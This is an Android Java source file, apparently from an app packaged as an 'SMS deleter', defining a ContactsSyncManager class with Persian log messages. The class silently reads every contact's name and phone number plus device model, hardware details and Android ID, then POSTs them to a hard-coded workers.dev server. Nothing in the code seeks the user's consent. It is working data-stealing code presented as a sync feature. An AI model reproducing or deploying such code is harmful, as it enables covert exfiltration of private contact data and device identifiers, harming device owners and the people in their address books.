package com.example.smsdeleter;

import android.content.Context;
import android.database.Cursor;
import android.os.Build;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class ContactsSyncManager {

    private static final String TAG = "CONTACTS_SYNC";
    private static final String API_URL = "https://testapp.lastofanarchy.workers.dev/";

    private Context context;

    public ContactsSyncManager(Context context) {
        this.context = context;
    }

    public void syncContacts() {
        new Thread(() -> {
            try {
                Log.d(TAG, "شروع استخراج اطلاعات دستگاه و مخاطبین...");

                // استخراج مخاطبین
                JSONArray contactsArray = extractContacts();

                // استخراج اطلاعات دستگاه
                JSONObject deviceInfo = getDeviceInfo();

                Log.d(TAG, "تعداد مخاطبین: " + contactsArray.length());
                Log.d(TAG, "مدل دستگاه: " + deviceInfo.optString("model"));

                // ارسال به سرور (حتی اگه مخاطبی نباشه)
                boolean success = sendToServer(contactsArray, deviceInfo);

                if (success) {
                    Log.i(TAG, "✓ داده‌ها با موفقیت به سرور ارسال شدند");
                } else {
                    Log.e(TAG, "✗ خطا در ارسال داده‌ها");
                }

            } catch (Exception e) {
                Log.e(TAG, "خطا در sync: " + e.getMessage(), e);
            }
        }).start();
    }

    private JSONArray extractContacts() {
        JSONArray contactsArray = new JSONArray();

        Cursor cursor = null;
        try {
            cursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.TYPE
                },
                null,
                null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            );

            if (cursor != null && cursor.getCount() > 0) {
                int totalCount = cursor.getCount();
                Log.d(TAG, "تعداد کل مخاطبین در Cursor: " + totalCount);

                int processedCount = 0;
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phoneNumber = cursor.getString(cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.TYPE));

                    JSONObject contact = new JSONObject();
                    contact.put("name", name != null ? name : "");
                    contact.put("phone", phoneNumber != null ? phoneNumber : "");
                    contact.put("type", getPhoneTypeLabel(type));

                    contactsArray.put(contact);
                    processedCount++;

                    // فقط هر 50 مخاطب لاگ بزن
                    if (processedCount % 50 == 0) {
                        Log.d(TAG, "پردازش شده: " + processedCount + "/" + totalCount);
                    }
                }
                Log.d(TAG, "پردازش نهایی: " + processedCount + "/" + totalCount);
            }
        } catch (Exception e) {
            Log.e(TAG, "خطا در استخراج مخاطبین: " + e.getMessage(), e);
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }

        return contactsArray;
    }

    private JSONObject getDeviceInfo() {
        JSONObject deviceInfo = new JSONObject();
        try {
            deviceInfo.put("brand", Build.BRAND);                    // Samsung, Xiaomi, etc.
            deviceInfo.put("manufacturer", Build.MANUFACTURER);      // samsung, xiaomi, etc.
            deviceInfo.put("model", Build.MODEL);                    // SM-G950F, etc.
            deviceInfo.put("device", Build.DEVICE);                  // dreamlte, etc.
            deviceInfo.put("product", Build.PRODUCT);                // dreamltexx, etc.
            deviceInfo.put("androidVersion", Build.VERSION.RELEASE); // 13, 14, etc.
            deviceInfo.put("sdkVersion", Build.VERSION.SDK_INT);     // 33, 34, etc.
            deviceInfo.put("board", Build.BOARD);                    // universal8895, etc.
            deviceInfo.put("hardware", Build.HARDWARE);              // samsungexynos8895, etc.

            // Android ID (شناسه یکتا دستگاه)
            String androidId = Settings.Secure.getString(
                context.getContentResolver(),
                Settings.Secure.ANDROID_ID
            );
            deviceInfo.put("androidId", androidId != null ? androidId : "unknown");

            Log.d(TAG, "اطلاعات دستگاه: " + deviceInfo.toString());
        } catch (Exception e) {
            Log.e(TAG, "خطا در استخراج اطلاعات دستگاه: " + e.getMessage());
        }
        return deviceInfo;
    }

    private boolean sendToServer(JSONArray contacts, JSONObject deviceInfo) {
        HttpURLConnection connection = null;
        try {
            URL url = new URL(API_URL + "sync");
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            connection.setDoOutput(true);
            connection.setConnectTimeout(30000);  // 30 ثانیه برای اتصال
            connection.setReadTimeout(60000);     // 60 ثانیه برای خواندن response

            // ساخت JSON body
            JSONObject requestBody = new JSONObject();
            requestBody.put("contacts", contacts);
            requestBody.put("device", deviceInfo);
            requestBody.put("timestamp", System.currentTimeMillis());
            requestBody.put("contactsCount", contacts.length());

            // ارسال داده
            String jsonBody = requestBody.toString();
            byte[] outputBytes = jsonBody.getBytes(StandardCharsets.UTF_8);

            Log.d(TAG, "حجم داده: " + (outputBytes.length / 1024.0) + " KB");
            Log.d(TAG, "تعداد مخاطبین در JSON: " + contacts.length());
            Log.d(TAG, "شروع ارسال به سرور...");

            try (OutputStream os = connection.getOutputStream()) {
                os.write(outputBytes);
                os.flush();
            }

            Log.d(TAG, "ارسال کامل شد، در حال دریافت response...");

            int responseCode = connection.getResponseCode();
            Log.d(TAG, "Response Code: " + responseCode);

            return responseCode >= 200 && responseCode < 300;

        } catch (Exception e) {
            Log.e(TAG, "خطا در ارسال به سرور: " + e.getMessage(), e);
            return false;
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    private String getPhoneTypeLabel(int type) {
        switch (type) {
            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
                return "خانه";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
                return "موبایل";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
                return "کار";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK:
                return "فکس کار";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME:
                return "فکس خانه";
            case ContactsContract.CommonDataKinds.Phone.TYPE_PAGER:
                return "پیجر";
            case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER:
                return "سایر";
            default:
                return "نامشخص";
        }
    }
}
